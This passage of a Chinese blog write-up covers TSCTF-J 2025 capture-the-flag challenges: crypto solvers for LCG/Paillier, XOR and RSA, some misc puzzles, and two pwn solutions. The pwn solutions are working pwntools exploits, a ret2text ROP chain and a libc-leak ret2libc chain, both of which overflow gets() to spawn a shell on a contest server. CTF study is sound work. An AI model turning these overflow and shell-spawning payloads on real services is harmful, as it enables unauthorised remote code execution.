class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(coeffs)):</span><br><span class="line">        n_flag += coeffs[i] * (<span class="number">3</span> ** i)</span><br><span class="line"></span><br><span class="line">    flag = long_to_bytes(n_flag)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<ol>
<li>读取挑战数据<br>从challenge.txt中读取关键信息：Paillier 加密的公钥n、g，系数长度k，方程组数量eqs，以及加密后的密文列表和 LCG 生成器的原始输出值。</li>
<li>破解 LCG 参数（m, a, b）<br>LCG（线性同余生成器）的状态更新公式为state &#x3D; (a * state + b) % m，题解通过以下方式破解其参数：<br>计算 LCG 输出序列的一阶差分D（相邻元素的差），利用 LCG 的性质，差分序列满足D[i+1] &#x3D; a * D[i] % m。<br>计算二阶差分相关的T序列（T[i] &#x3D; D[i]<em>D[i+2] - D[i+1]^2），这些T值均为m的倍数，因此它们的最大公约数即为m。<br>已知m后，利用一阶差分D求解a（比例系数）和b（偏移量），通过线性同余方程D[i+1] ≡ a</em>D[i] mod m反推a，再代入状态公式求b。</li>
<li>解密得到 y 序列<br>题目中使用简化的 Paillier 加密y值，加密公式为c &#x3D; (g^m_val * r^n) % n²（g &#x3D; n+1）。解密过程：<br>由 LCG 的原始输出raw计算r &#x3D; raw % n，并得到r^n mod n²。<br>求r^n的模逆，与密文c相乘，得到g^m_val mod n²。<br>利用g &#x3D; n+1的性质，(n+1)^m_val ≈ 1 + m_val*n mod n²（二项式展开近似），因此(g^m_val - 1) &#x2F;&#x2F; n即为原始y值。</li>
<li>解线性方程组求系数 coeffs<br>题目中y序列的后半部分是前半部分与coeffs的线性组合（y[k+i] &#x3D; sum(coeffs[j] * y[i+k-1-j])）。据此构建线性方程组：<br>矩阵A的行由前k个y值的滑动窗口组成。<br>向量b由后半部分的y值组成。<br>求解方程组A * coeffs &#x3D; b，得到coeffs（flag 的三进制表示系数）。</li>
<li>还原 flag<br>coeffs是 flag 的三进制表示（从低位到高位），将其转换为整数（n_flag &#x3D; sum(coeffs[i] * 3^i)），再转成字节序列即得到 flag TSCTF-J{We_sh0u1d_kn0w!}<br><img src="/2025/11/14/TSCTFwp/image-23.png" alt="alt text"></li>
</ol>
<h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign in"></a>Sign in</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的十六进制值</span></span><br><span class="line">KEY1_hex = <span class="string">&quot;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&quot;</span></span><br><span class="line">KEY2_xor_KEY1_hex = <span class="string">&quot;b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83&quot;</span></span><br><span class="line">KEY2_xor_KEY3_hex = <span class="string">&quot;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&quot;</span></span><br><span class="line">FLAG_xor_all_hex = <span class="string">&quot;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制字符串转换为整数</span></span><br><span class="line">KEY1 = <span class="built_in">int</span>(KEY1_hex, <span class="number">16</span>)</span><br><span class="line">KEY2_xor_KEY1 = <span class="built_in">int</span>(KEY2_xor_KEY1_hex, <span class="number">16</span>)</span><br><span class="line">KEY2_xor_KEY3 = <span class="built_in">int</span>(KEY2_xor_KEY3_hex, <span class="number">16</span>)</span><br><span class="line">FLAG_xor_all = <span class="built_in">int</span>(FLAG_xor_all_hex, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算KEY2：KEY2 = (KEY2 ^ KEY1) ^ KEY1</span></span><br><span class="line">KEY2 = KEY2_xor_KEY1 ^ KEY1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算KEY3：KEY3 = (KEY2 ^ KEY3) ^ KEY2</span></span><br><span class="line">KEY3 = KEY2_xor_KEY3 ^ KEY2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算m：m = (FLAG ^ KEY1 ^ KEY2 ^ KEY3) ^ KEY1 ^ KEY2 ^ KEY3</span></span><br><span class="line">m = FLAG_xor_all ^ KEY1 ^ KEY2 ^ KEY3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将m转换为十六进制字符串</span></span><br><span class="line">m_hex = <span class="built_in">hex</span>(m)[<span class="number">2</span>:]  <span class="comment"># [2:] 是为了去掉 &#x27;0x&#x27; 前缀</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保十六进制字符串的长度是偶数，如果不是则在前面补0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(m_hex) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">    m_hex = <span class="string">&#x27;0&#x27;</span> + m_hex</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将十六进制字符串转换为bytes</span></span><br><span class="line">m_bytes = <span class="built_in">bytes</span>.fromhex(m_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行base64解码得到flag</span></span><br><span class="line">flag = base64.b64decode(m_bytes).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-24.png" alt="alt text">TSCTF-J{I_like_Crypto}</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知参数</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543</span></span><br><span class="line">c = <span class="number">6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算p + q的正确值</span></span><br><span class="line">s = (<span class="number">1</span> &lt;&lt; <span class="number">1024</span>) + (<span class="number">1</span> &lt;&lt; <span class="number">1023</span>)  <span class="comment"># 2^1024 + 2^1023</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算k = s^2 - 4n，然后开平方得到p - q</span></span><br><span class="line">k = s * s - <span class="number">4</span> * n</span><br><span class="line">d = <span class="built_in">int</span>(math.isqrt(k))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证d是否正确</span></span><br><span class="line"><span class="keyword">if</span> d * d != k:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法计算正确的d值&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算p和q</span></span><br><span class="line">p = (s + d) // <span class="number">2</span></span><br><span class="line">q = (s - d) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证p*q是否等于n</span></span><br><span class="line"><span class="keyword">if</span> p * q != n:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;分解n失败&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算欧拉函数</span></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥d</span></span><br><span class="line">d_private = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密得到明文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d_private, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字节并输出flag</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-25.png" alt="alt text">TSCTF-J{The_easiest_RSA_key!}</p>
<h1 id="Misc-方向"><a href="#Misc-方向" class="headerlink" title="Misc 方向"></a>Misc 方向</h1><h2 id="BadFile"><a href="#BadFile" class="headerlink" title="BadFile"></a>BadFile</h2><p>直接按照文件大小排序 最大的几个文件基本都是问题文件 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3WQlwSaj.txt_dubZ3AZn.txt_nhlbNxGL.txt_qtFyaGkZ.txt_wlBUCOeg.txt_2JuiKL42.wav_4UjLqeRF.wav_Ew24ldS2.wav_HjRtD6f3.wav_RtUwEgj1.wav_8YmxZRca.pdf_Z8P4DHre.pdf_mFU1SdVp.pdf_w9V1ZDEd.pdf_xdBqKtxe.pdf</span><br></pre></td></tr></table></figure>
<p>TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}</p>
<h2 id="卢森堡的秘密"><a href="#卢森堡的秘密" class="headerlink" title="卢森堡的秘密"></a>卢森堡的秘密</h2><p>隐写术 用zsteg 查看即可 </p>
<h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><p>用Meow 运行 得到如下顺序 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vfndveyTsNSk</span><br><span class="line">mv9bBq==</span><br><span class="line">xZrFq2fu</span><br><span class="line">x01LB3Dnztb3</span><br><span class="line">iseHFq==</span><br></pre></td></tr></table></figure>
<p>将大小写转换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VFNDVEYtSnsKMV9BbQ==XzRfQ2FUX01lb3dNZTB3ISEhfQ==</span><br></pre></td></tr></table></figure>
<p>分别base64编码即可<br>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</p>
<h1 id="AI-方向"><a href="#AI-方向" class="headerlink" title="AI 方向"></a>AI 方向</h1><h2 id="Coup"><a href="#Coup" class="headerlink" title="Coup"></a>Coup</h2><p>这个有点搞 我0提示词直接通过游戏获得flag了 </p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>源代码 利用 ret 即可 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(_bss_start, 0LL, 2, 0LL);</span><br><span class="line">  vuln();</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v1[16]; // [rsp+0h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  puts(&quot;Welcome to TSCTF-J2025!&quot;);</span><br><span class="line">  puts(&quot;Just a simple sign-in!&quot;);</span><br><span class="line">  return gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置连接</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./binary&#x27;)  # 本地测试</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.232.1&#x27;</span>, <span class="number">61752</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键地址</span></span><br><span class="line">offset = <span class="number">24</span>  <span class="comment"># 缓冲区(16) + rbp(8) = 24字节</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400773</span>  <span class="comment"># pop rdi; ret  gadget</span></span><br><span class="line">bin_sh_addr = <span class="number">0x400794</span>   <span class="comment"># &quot;/bin/sh&quot;字符串地址</span></span><br><span class="line">system_plt = <span class="number">0x400530</span>    <span class="comment"># system函数PLT地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset                <span class="comment"># 填充缓冲区和rbp</span></span><br><span class="line">payload += p64(pop_rdi_ret)            <span class="comment"># 调用pop rdi; ret gadget</span></span><br><span class="line">payload += p64(bin_sh_addr)            <span class="comment"># 将/bin/sh地址放入rdi寄存器</span></span><br><span class="line">payload += p64(system_plt)             <span class="comment"># 调用system函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得交互shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>由此可以获得服务器shell 获得flag<br><img src="/2025/11/14/TSCTFwp/image-26.png" alt="alt text"><br>TSCTF-J{WE1coM3-To_TH3_WOrLD-OF-binAry-vUlnErAblLitY7} </p>
<h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化程序和libc</span></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)  <span class="comment"># 64位目标程序</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)  <span class="comment"># 64位libc库</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line"><span class="comment"># = remote(&#x27;192.168.195.1&#x27;, 54821)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取必要的地址</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = e.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位需要ROPgadget来获取控制寄存器的gadget</span></span><br><span class="line"><span class="comment"># 查找pop rdi; ret gadget，用于设置第一个参数</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400713</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建第一个payload：泄露puts的真实地址</span></span><br><span class="line"><span class="comment"># 64位中，参数通过寄存器传递，需要使用gadget设置rdi</span></span><br><span class="line"><span class="comment"># 注意：偏移量112可能需要根据实际程序调整</span></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span>  <span class="comment"># 填充到返回地址，64位通常需要更多字节</span></span><br><span class="line">payload1 += p64(pop_rdi_ret)  <span class="comment"># 弹出rdi寄存器</span></span><br><span class="line">payload1 += p64(puts_got)     <span class="comment"># 将puts的got地址放入rdi（作为puts的参数）</span></span><br><span class="line">payload1 += p64(puts_plt)     <span class="comment"># 调用puts函数，输出puts的真实地址</span></span><br><span class="line">payload1 += p64(start_addr)   <span class="comment"># 调用_start重新运行程序，以便发送第二个payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送第一个payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;No backdoors this time!&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收puts的真实地址（64位地址占8个字节）</span></span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印调试信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;puts_plt: <span class="subst">&#123;<span class="built_in">hex</span>(puts_plt)&#125;</span>, puts_got: <span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>, start_addr: <span class="subst">&#123;<span class="built_in">hex</span>(start_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;puts_real_addr: <span class="subst">&#123;<span class="built_in">hex</span>(puts_real_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc基地址和system、/bin/sh的地址</span></span><br><span class="line">libc_base = puts_real_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建第二个payload：获取shell</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span>  <span class="comment"># 同样的填充长度</span></span><br><span class="line">payload2 += p64(<span class="number">0x4004c9</span>)</span><br><span class="line">payload2 += p64(pop_rdi_ret)   <span class="comment"># 弹出rdi寄存器</span></span><br><span class="line">payload2 += p64(binsh_addr)    <span class="comment"># 将/bin/sh地址放入rdi（作为system的参数）</span></span><br><span class="line">payload2 += p64(system_addr)   <span class="comment"># 调用system函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送第二个payload</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;No backdoors this time!&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互获取shell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2025/11/14/TSCTFwp/image-27.png" alt="alt text"><br>这个脚本我本地测试是可以获得shell的 但是远程的时候报错<br><img src="/2025/11/14/TSCTFwp/image-28.png" alt="alt text">  最后时间来不及了 没做出来<img src="/2025/11/14/TSCTFwp/image.png" alt="alt text"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://1lnk.top">Link</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://1lnk.top/2025/11/14/TSCTFwp/">http://1lnk.top/2025/11/14/TSCTFwp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://1lnk.top" target="_blank">Link's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80/">基础</a></div><div class="post-share"><div class="social-share" data-image="/2025/11/14/TSCTFwp/cover.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/11/15/EZ_PY/" title="EZ_PY"><img class="cover" src="/2025/11/15/EZ_PY/cover.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">EZ_PY</div></div><div class="info-2"><div class="info-item-1">EZ_PY前置知识原型链污染JWT验证JWT（JSON Web Token）验证的核心是通过签名确保 Token 未被篡改，同时验证 Token 的合法性（有效期、签发者等），避免身份伪造。核心验证原理JWT 由Header.Payload.Signature三段式字符串组成，验证过程围绕这三部分展开，核心是 “签名校验” 和 “内容合法性校验”。  验证前的基础处理服务器接收 Token 后，先按.分割为 Header、Payload、Signature 三部分。对 Header 和 Payload 分别进行 Base64 解码（注意：Base64 是编码而非加密，可直接解码查看内容）。 核心：签名校验（防篡改关键）签名是 JWT 验证的核心，目的是确认 Token 内容未被修改，且来自合法签发者。服务器获取本地存储的密钥（如你之前提到的 SECRET_KEY，HS256 算法用对称密钥，RS256 用私钥签名、公钥验证）。按 Header 中指定的算法（如 HS256），用 “解码后的 Header + 解码后的 Payload + 密钥” 重新计算签名。将重新计算的签名，与...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Link</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/link66668"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/link66668" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/1123882463" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #FB7299;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">CS2 is the best game</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-%E6%96%B9%E5%90%91"><span class="toc-number">1.</span> <span class="toc-text">Web 方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%89%E6%B8%A1"><span class="toc-number">1.1.</span> <span class="toc-text">争渡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-sql"><span class="toc-number">1.2.</span> <span class="toc-text">EZ_sql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EZ-login"><span class="toc-number">1.3.</span> <span class="toc-text">EZ_login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Druid"><span class="toc-number">1.4.</span> <span class="toc-text">Druid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Findsecret"><span class="toc-number">1.5.</span> <span class="toc-text">Findsecret</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse-%E6%96%B9%E5%90%91"><span class="toc-number">2.</span> <span class="toc-text">Reverse 方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Singin"><span class="toc-number">2.1.</span> <span class="toc-text">Singin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AC%E7%BB%BF%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">2.2.</span> <span class="toc-text">听绿的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CryDancing"><span class="toc-number">2.3.</span> <span class="toc-text">CryDancing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.3.1.</span> <span class="toc-text">主要程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86flag%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.3.2.</span> <span class="toc-text">加密flag程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%EF%BC%88Key%EF%BC%89%E5%A4%84%E7%90%86%EF%BC%9A%E7%94%9F%E6%88%90-AES-%E5%8A%A0%E5%AF%86%E7%9A%84%E5%AF%86%E9%92%A5"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">密钥（Key）处理：生成 AES 加密的密钥</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E6%96%87%E6%9C%AC%E9%A2%84%E5%A4%84%E7%90%86%EF%BC%9A%E8%BD%AC%E4%B8%BA%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">输入文本预处理：转为二进制数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E5%AF%86%E9%92%A5%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.3.3.</span> <span 